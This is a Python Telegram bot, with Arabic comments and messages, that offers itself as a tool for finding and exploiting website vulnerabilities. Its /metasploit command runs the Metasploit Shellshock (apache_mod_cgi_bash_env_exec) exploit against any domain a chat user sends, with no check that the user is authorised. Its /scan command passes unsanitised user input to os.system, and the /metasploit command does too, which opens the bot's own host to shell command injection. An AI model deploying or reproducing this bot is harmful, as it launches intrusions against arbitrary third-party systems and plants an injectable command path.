import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv

# تحميل المتغيرات من ملف .env
load_dotenv()

# الحصول على التوكن من متغير البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # رسالة الترحيب مع معلومات عن البوت
    await update.message.reply_text(
        "مرحبًا! 👋\n\n"
        "🔧 **تم تطوير هذا البوت بواسطة:**\n"
        "ماجد المهندس، مؤسس شركة **باج باونتي** في اليمن، وهي الأولى في هذا المجال.\n\n"
        
        "🛠️ **الأداة تقوم بما يلي:**\n"
        "- اكتشاف الثغرات الأمنية في المواقع\n"
        "- استغلال الثغرات باستخدام أدوات مثل `nmap`, `subfinder`, `httpx`, `nuclei`، و `Metasploit`.\n\n"
        
        "🚀 **كيفية الاستخدام:**\n"
        "1. ارسل لي اسم النطاق الذي ترغب في فحصه باستخدام الأمر التالي:\n"
        "`/scan <domain_name>`\n"
        "2. سيقوم البوت بتنفيذ الفحص وإرسال النتائج فور الانتهاء.\n\n"
        
        "💡 إذا كنت بحاجة إلى مساعدة، يمكنك دائمًا استخدام الأمر `/help`.\n\n"
        
        "📞 **للتواصل مع المعد (ماجد المهندس) عبر تيلجرام:**\n"
        "- [@helx1](https://t.me/helx1)\n"
        "- [@helxsa](https://t.me/helxsa)\n"
        "- [@helxone](https://t.me/helxone)"
    )

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    domain = ' '.join(context.args)
    if not domain:
        await update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /scan")
        return

    # تنفيذ فحص باستخدام الأدوات التي تديرها في السكربت
    os.system(f"./scanner.sh {domain}")
    await update.message.reply_text(f"تم الانتهاء من فحص النطاق: {domain}. تحقق من الملفات الناتجة.")

async def metasploit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # استخدام Metasploit لتشغيل فحص أو استغلال
    domain = ' '.join(context.args)
    if not domain:
        await update.message.reply_text("يرجى إرسال اسم النطاق بعد الأمر /metasploit")
        return

    # تكامل مع Metasploit باستخدام سكربت أو أوامر معينة
    os.system(f"msfconsole -x 'use exploit/unix/http/apache_mod_cgi_bash_env_exec; set RHOST {domain}; run'")
    await update.message.reply_text(f"تم تنفيذ هجوم Metasploit على النطاق: {domain}. تحقق من النتائج.")

# تهيئة التطبيق
application = Application.builder().token(BOT_TOKEN).build()

# إضافة معالجات الأوامر
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("scan", scan))
application.add_handler(CommandHandler("metasploit", metasploit))

# بدء البوت
application.run_polling()
